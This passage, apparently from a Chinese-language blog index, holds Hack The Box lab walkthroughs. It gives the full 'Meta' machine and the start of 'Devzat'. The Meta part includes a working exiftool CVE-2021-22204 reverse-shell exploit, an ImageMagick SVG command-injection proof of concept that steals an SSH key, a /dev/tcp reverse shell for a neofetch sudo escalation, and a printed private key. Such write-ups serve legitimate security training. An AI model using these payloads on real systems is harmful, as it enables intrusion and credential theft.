ls\nroot.txt\nroot@production:~# cat root.txt \n4a243e1e3ccb05dbcd7a29abb49d3bcf\n```\n成功拿到root的flag文件","tags":["Hackthebox"]},{"title":"Meta - Hackthebox","url":"/2022/02/22/Hackthebox/Medium/Hackthebox-Meta/","content":"\n# Hackthebox - Meta\n## 靶场信息\n![](Hackthebox-Meta/3c4a18f1-9183-44ce-a29e-4c4f4c25a371.png)\n\n## 靶场类型\n![](Hackthebox-Meta/32030297-7f11-4cff-9252-ef4e42fb962e.png)\n\n## 信息搜集\n### Nmap\n首先使用nmap进行端口扫描\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.140\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-02-19 21:46 EST\nNmap scan report for 10.10.11.140\nHost is up (0.22s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey: \n|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)\n|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)\n|_  256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)\n80/tcp open  http    Apache httpd\n|_http-server-header: Apache\n|_http-title: Did not follow redirect to http://artcorp.htb\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=2/19%OT=22%CT=1%CU=40520%PV=Y%DS=2%DC=T%G=Y%TM=6211ABB\nOS:2%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS\nOS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1\nOS:1NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN\nOS:(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 8888/tcp)\nHOP RTT       ADDRESS\n1   222.35 ms 10.10.14.1\n2   222.43 ms 10.10.11.140\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 45.02 seconds\n```\n### Http\n进入80端口会自动跳转到artcorp.htb，先加入到hosts\n\n```bash\necho 10.10.11.140 artcorp.htb >> /etc/hosts\n```\n![](Hackthebox-Meta/a47ef151-9c4c-4802-a117-2d6c6a919240.png)\n\n看样子是一家艺术公司，进来后没有什么有用的东西，先fuzz一下目录看看吧\n\n### Fuzz\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ffuf -u \"http://artcorp.htb/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt \n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://artcorp.htb/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n________________________________________________\n\nassets                  [Status: 301, Size: 234, Words: 14, Lines: 8]\ncss                     [Status: 301, Size: 231, Words: 14, Lines: 8]\nserver-status           [Status: 403, Size: 199, Words: 14, Lines: 8]\n                        [Status: 200, Size: 4427, Words: 1663, Lines: 87]\n:: Progress: [20116/20116] :: Job [1/1] :: 180 req/sec :: Duration: [0:01:54] :: Errors: 0 ::\n```\n也没什么有用的东西，去fuzz一下子域名看看\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ffuf -c -u http://artcorp.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H \"Host: FUZZ.artcorp.htb\"  -mc 200\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://artcorp.htb\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n :: Header           : Host: FUZZ.artcorp.htb\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200\n________________________________________________\n\ndev01                   [Status: 200, Size: 247, Words: 16, Lines: 10]\n:: Progress: [4989/4989] :: Job [1/1] :: 179 req/sec :: Duration: [0:00:32] :: Errors: 0 ::\n```\n有一个dev01，加入到hosts\n\n```bash\necho 10.10.11.140 dev01.artcorp.htb >> /etc/hosts\n```\n![](Hackthebox-Meta/bd696eb1-b9e8-4361-a8f1-7fab5b43ce99.png)\n\n### Uploads\n看不太懂有什么用，先点点看看吧\n\n![](Hackthebox-Meta/7c68501a-fcb2-4b69-87d0-3a8c3cee3e04.png)\n\n这边是一个上传点，上传一个shell试试\n\n![](Hackthebox-Meta/aaa7a0ae-161d-4559-bca9-363e7148e9d4.png)\n\n提示只能上传jpg和png格式的文件，那就随便拿张图试试吧\n\n![](Hackthebox-Meta/4fd9c1c1-0e61-420c-9149-7e0f27b1019d.png)\n\n这里列出了图片的属性信息，我猜测应该是图片隐写或者exiftool的cve漏洞之类的\n\n本地使用exiftool进行确认一下\n\n![](Hackthebox-Meta/5b3a584c-11fe-44b9-a6c1-f8d706684b30.png)\n\n可以对上，是exiftool无疑了，去搜索一下exiftool的漏洞\n\n### 漏洞利用\n![](Hackthebox-Meta/bc0134a4-f6b6-40b2-a08c-0c17677d05f2.png)\n\n发现一个可用的漏洞\n\n> [https://github.com/convisolabs/CVE-2021-22204-exiftool](https://github.com/convisolabs/CVE-2021-22204-exiftool)\n\n下载下来后将IP和端口修改为自己的\n\n```bash\n#!/bin/env python3\n\nimport base64\nimport subprocess\n\nip = '10.10.14.16'\nport = '4444'\n\npayload = b\"(metadata \\\"\\c${use MIME::Base64;eval(decode_base64('\"\n\npayload = payload + base64.b64encode( f\"use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in({port},inet_aton('{ip}')))){{open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');}};\".encode() )\n\npayload = payload + b\"'))};\\\")\"\n\npayload_file = open('payload', 'w')\npayload_file.write(payload.decode('utf-8'))\npayload_file.close()\n\nsubprocess.run(['bzz', 'payload', 'payload.bzz'])\nsubprocess.run(['djvumake', 'exploit.djvu', \"INFO=1,1\", 'BGjp=/dev/null', 'ANTz=payload.bzz'])\nsubprocess.run(['exiftool', '-config', 'configfile', '-HasselbladExif<=exploit.djvu', 'image.jpg'])\n```\n然后执行\n\n```bash\n┌──(root💀kali)-[~/Desktop/CVE-2021-22204-exiftool]\n└─# python3 exploit.py                          \n    1 image files updated\n\n┌──(root💀kali)-[~/Desktop/CVE-2021-22204-exiftool]\n└─# ls    \nconfigfile  exploit.djvu  exploit.py  image.jpg  image.jpg_original  lab  payload  payload.bzz  README.md\n```\n生成出来的image.jpg就是我们的shell了，拿去上传到web里\n\n然后本地运行一个nc监听端口\n\n```bash\nnc -nvlp 4444\n```\n![](Hackthebox-Meta/c9bec073-a3ec-4f05-9003-035441d87cd7.png)\n\n选择后执行即可\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nc -nvlp 4444                                       \nlistening on [any] 4444 ...\nconnect to [10.10.14.16] from (UNKNOWN) [10.10.11.140] 39314\n/bin/sh: 0: can't access tty; job control turned off\n$ python3 -c \"import pty;pty.spawn('/bin/bash')\";\nbash-5.0$ whoami&&id\nwhoami&&id\nwww-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n成功拿到一个shell\n\n```bash\nCtrl+Z返回\nstty raw -echo; fg\nexport TERM=xterm\nstty rows 51 cols 237\n```\n## 权限提升\n### User\n在/home/thomas中看到有.ssh文件夹\n\n进入.ssh文件夹拿key，但是发现没权限\n\n```bash\nbash-5.0$ find /usr/ -type f -newermt '2022-01-01' -ls\n   152500      4 -rwxr-xr-x   1 root     root          126 Jan  3 10:13 /usr/local/bin/convert_images.sh\n```\n查找一下从2022-01-01开始创建的新文件，找到了一个sh脚本\n\n或是运行pspy64也可以发现这个脚本\n\n我们查看一下\n\n```bash\n#!/bin/bash\ncd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null\npkill mogrify\n```\n这里mogrify只是一个简单的脚本，使用ImageMgick的mogrify将发现的文件转换为png\n\n```bash\nbash-5.0$ /usr/local/bin/mogrify -version\nVersion: ImageMagick 7.0.10-36 Q16 x86_64 2021-08-29 https://imagemagick.org\nCopyright: © 1999-2020 ImageMagick Studio LLC\nLicense: https://imagemagick.org/script/license.php\nFeatures: Cipher DPC HDRI OpenMP(4.5) \nDelegates (built-in): fontconfig freetype jng jpeg png x xml zlib\n```\n> [https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html](https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html)\n\n有一个相关漏洞\n\n生成一个poc.svg\n\n```bash\n<image authenticate='ff\" `echo $(id)> /dev/shm/0wned`;\"'>\n  <read filename=\"pdf:/etc/passwd\"/>\n  <get width=\"base-width\" height=\"base-height\" />\n  <resize geometry=\"400x400\" />\n  <write filename=\"test.png\" />\n  <svg width=\"700\" height=\"700\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">       \n  <image xlink:href=\"msl:poc.svg\" height=\"100\" width=\"100\"/>\n  </svg>\n</image>\n```\n测试一下是否可以以thomas的身份执行命令\n\n```bash\ncp poc.svg /var/www/dev01.artcorp.htb/convert_images/\n\nbash-5.0$ ls -la\ntotal 12\ndrwxrwxrwt  2 root     root      100 Feb 21 23:53 .\ndrwxr-xr-x 16 root     root     3080 Feb 21 10:51 ..\n-rw-r--r--  1 thomas   thomas     54 Feb 21 23:53 0wned\n-rw-r--r--  1 www-data www-data  406 Feb 21 23:52 poc.svg\nbash-5.0$ cat 0wned \nuid=1000(thomas) gid=1000(thomas) groups=1000(thomas)\n```\n确认可以以thomas的身份执行命令，咱们修改一下poc的第一句，用thomas的权限把ssh的key给拿出来\n\n```bash\n<image authenticate='ff\" `echo $(cat ~/.ssh/id_rsa)> /dev/shm/id_rsa`;\"'>\n```\n然后再执行一次\n\n```bash\nbash-5.0$ ls -la\ntotal 16\ndrwxrwxrwt  2 root     root      120 Feb 21 23:58 .\ndrwxr-xr-x 16 root     root     3080 Feb 21 10:51 ..\n-rw-r--r--  1 thomas   thomas     54 Feb 21 23:53 0wned\n-rw-r--r--  1 thomas   thomas   2590 Feb 21 23:58 id_rsa\n-rw-r--r--  1 www-data www-data  422 Feb 21 23:56 poc.svg\n```\n已经储存过来了，查看一下\n\n```bash\n\n-----BEGIN OPENSSH PRIVATE KEY-----\n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\nbhFErAeoncE3vJAAAACXJvb3RAbWV0YQE=\n-----END OPENSSH PRIVATE KEY-----\n\n```\n成功拿到thomas的key，现在保存到本地id\\_rsa后给他600的权限\n\n```bash\nchmod 600 id_rsa\n```\n然后使用ssh进行连接\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ssh thomas@artcorp.htb -i id_rsa \nLinux meta 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Mon Feb 21 15:30:44 2022 from 10.10.14.147\n-bash-5.0$ whoami&&id\nthomas\nuid=1000(thomas) gid=1000(thomas) groups=1000(thomas)\n```\n```bash\n-bash-5.0$ ls\nuser.txt\n-bash-5.0$ cat user.txt \n9e36bb6959f1ba118cfe71b928ac66b6\n```\n成功拿到user权限的flag文件\n\n### Root\n```bash\n-bash-5.0$ sudo -l\nMatching Defaults entries for thomas on meta:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, env_keep+=XDG_CONFIG_HOME\n\nUser thomas may run the following commands on meta:\n    (root) NOPASSWD: /usr/bin/neofetch \\\"\\\"\n```\nsudo -l看到有一个可以root权限执行的neofetch\n\n> [https://gtfobins.github.io/gtfobins/neofetch/](https://gtfobins.github.io/gtfobins/neofetch/)\n\n这里找到一个提权相关的\n\n但是有一点不一样，这里的权限只能使用指定参数\n\n但是会保留XDG\\_CONFIG\\_HOME的环境变量\n\n然后当前用户的neofetch配置文件可控\n\n现在按照这个思路来操作吧\n\n```bash\n-bash-5.0$ cd ~/.config/neofetch/\n-bash-5.0$ ls -la\ntotal 24\ndrwxr-xr-x 2 thomas thomas  4096 Feb 21 13:32 .\ndrwxr-xr-x 3 thomas thomas  4096 Aug 30 13:01 ..\n-rw-r--r-- 1 thomas thomas 14591 Aug 30 13:01 config.conf\n```\n1. 在config.conf的第一行添加一个反向shell\n\n```bash\n/bin/bash -c \"/bin/bash -i >& /dev/tcp/10.10.14.16/4444 0>&1\"\n```\n1. 将thomas.config导出到基本配置环境路径\n\n```bash\nexport XDG_CONFIG_HOME=\"$HOME/.config\"\n```\n1. 在本地启用nc监听一个端口\n\n```bash\nnc -nvlp 4444\n```\n1. 以root权限执行neofetch文件\n\n```bash\nsudo -u root /usr/bin/neofetch \\\"\\\"\n```\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.16] from (UNKNOWN) [10.10.11.140] 39366\nroot@meta:/home/thomas/.config/neofetch# whoami&&id\nwhoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\n成功获得root权限\n\n```bash\nroot@meta:/home/thomas/.config/neofetch# cd /root\ncd /root\nroot@meta:~# ls\nls\nconf\nroot.txt\n\ncat root.txt\nf3f5e2ad459dbd8842f813bec23889f0\n```\n成功拿到root权限的flag文件","tags":["Hackthebox"]},{"title":"Devzat - Hackthebox","url":"/2022/02/20/Hackthebox/Medium/Hackthebox-Devzat/","content":"\n# Hackthebox - Devzat\n## 靶场信息\n![](Hackthebox-Devzat/afd4673b-eefd-4e1a-8aa5-9e0aa2ce21fb.png)\n\n## 靶场类型\n![](Hackthebox-Devzat/aa4fdde1-b932-4085-a9e1-47aec6593959.png)\n\n## 信息搜集\n### Nmap\n首先使用nmap进行信息搜集\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.118\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-02-19 03:18 EST\nNmap scan report for devzat.htb (10.10.11.118)\nHost is up (0.24s latency).\nNot shown: 65532 closed ports\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA)\n|   256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA)\n|_  256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519)\n80/tcp   open  http    Apache httpd 2.4.41\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: devzat - where the devs at\n8000/tcp open  ssh     (protocol 2.0)\n| fingerprint-strings: \n|   NULL: \n|_    SSH-2.0-Go\n| ssh-hostkey: \n|_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port8000-TCP:V=7.91%I=7%D=2/19%Time=6210A7FD%P=x86_64-pc-linux-gnu%r(NU\nSF:LL,C,\"SSH-2\\.0-Go\\r\\n\");\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=2/19%OT=22%CT=1%CU=34522%PV=Y%DS=2%DC=T%G=Y%TM=6210A83\nOS:2%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS\nOS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1\nOS:1NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN\nOS:(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 554/tcp)\nHOP RTT       ADDRESS\n1   241.16 ms 10.10.14.1\n2   241.26 ms devzat.htb (10.10.11.118)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 93.93 seconds\n```\n### Http\n这里有一个http服务在80端口，直接访问ip会被跳转到devzat.htb页面，咱们添加到hosts再继续访问\n\n```bash\necho 10.10.11.118 devzat.htb >> /etc/hosts\n```\n![](Hackthebox-Devzat/0cecff08-8715-4b72-b911-715c109787c0.png)\n\n这个功能页面有点不明所以，往下看看\n\n![](Hackthebox-Devzat/874775c0-4e3b-432b-a6ed-5f7dcf9b9b1d.png)\n\n这里提示了一条命令，ssh服务疑似在8000端口\n\n搜索相关资料，找到了相关工具\n\n> [https://github.com/quackduck/devzat](https://github.com/quackduck/devzat)\n\n去测试一下试试\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ssh -l test devzat.htb -p 8000\n                                                                                                                                                                                                   8 minutes earlier\ndevbot: test has joined the chat \ntest: test \ntest: test \ntest: test \ntest: test \ndevbot: test has left the chat \ndevbot: test has joined the chat \n                                                                                                                                                                                                    1 minute earlier\ndevbot: test has left the chat \ndevbot: test stayed on for 6 minutes \ndevbot: test has joined the chat \ndevbot: test has left the chat \ndevbot: lucifiel has joined the chat\ndevbot: lucifiel has left the chat\ndevbot: test has joined the chat \n                                                                                                                                                                                          Less than a minute earlier\ndevbot: test has left the chat \ndevbot: test stayed on for 1 minute \nWelcome to the chat. There are no more users\ndevbot: test has joined the chat\ntest: /help\n[SYSTEM] Welcome to Devzat! Devzat is chat over SSH: github.com/quackduck/devzat\n[SYSTEM] Because there's SSH apps on all platforms, even on mobile, you can join from anywhere.\n[SYSTEM] \n[SYSTEM] Interesting features:\n[SYSTEM] • Many, many commands. Run /commands.\n[SYSTEM] • Rooms! Run /room to see all rooms and use /room #foo to join a new room.\n[SYSTEM] • Markdown support! Tables, headers, italics and everything. Just use in place of newlines.\n[SYSTEM] • Code syntax highlighting. Use Markdown fences to send code. Run /example-code to see an example.\n[SYSTEM] • Direct messages! Send a quick DM using =user <msg> or stay in DMs by running /room @user.\n[SYSTEM] • Timezone support, use /tz Continent/City to set your timezone.\n[SYSTEM] • Built in Tic Tac Toe and Hangman! Run /tic or /hang <word> to start new games.\n[SYSTEM] • Emoji replacements! (like on Slack and Discord)\n[SYSTEM] \n[SYSTEM] For replacing newlines, I often use bulkseotools.com/add-remove-line-breaks.php.\n[SYSTEM] \n[SYSTEM] Made by Ishan Goel with feature ideas from friends.\n[SYSTEM] Thanks to Caleb Denio for lending his server!\n[SYSTEM] \n[SYSTEM] For a list of commands run\n[SYSTEM] ┃ /commands\ntest: /commands\n[SYSTEM] Commands\n[SYSTEM] clear - Clears your terminal\n[SYSTEM] message - Sends a private message to someone\n[SYSTEM] users - Gets a list of the active users\n[SYSTEM] all - Gets a list of all users who has ever connected\n[SYSTEM] exit - Kicks you out of the chat incase your client was bugged\n[SYSTEM] bell - Toggles notifications when you get pinged\n[SYSTEM] room - Changes which room you are currently in\n[SYSTEM] id - Gets the hashed IP of the user\n[SYSTEM] commands - Get a list of commands\n[SYSTEM] nick - Change your display name\n[SYSTEM] color - Change your display name color\n[SYSTEM] timezone - Change how you view time\n[SYSTEM] emojis - Get a list of emojis you can use\n[SYSTEM] help - Get generic info about the server\n[SYSTEM] tictactoe - Play tictactoe\n[SYSTEM] hangman - Play hangman\n[SYSTEM] shrug - Drops a shrug emoji\n[SYSTEM] ascii-art - Bob ross with text\n[SYSTEM] example-code - Hello world!\ntest: /users\n[SYSTEM] [test]\n```\n没有发现可利用的点\n\n### Fuzz\n去fuzz一下子域名看下\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ffuf -c -u http://devzat.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H \"Host: FUZZ.devzat.htb\"  -mc 200 \n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://devzat.htb\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n :: Header           : Host: FUZZ.devzat.htb\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200\n________________________________________________\n\npets                    [Status: 200, Size: 510, Words: 20, Lines: 21]\n:: Progress: [4989/4989] :: Job [1/1] :: 166 req/sec :: Duration: [0:00:33] :: Errors: 0 ::\n```\n有一个pets，加入hosts里\n\n```bash\necho 10.10.11.118 pets.devzat.htb >> /etc/hosts\n```\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ffuf -u \"http://pets.devzat.htb/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 510\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/ 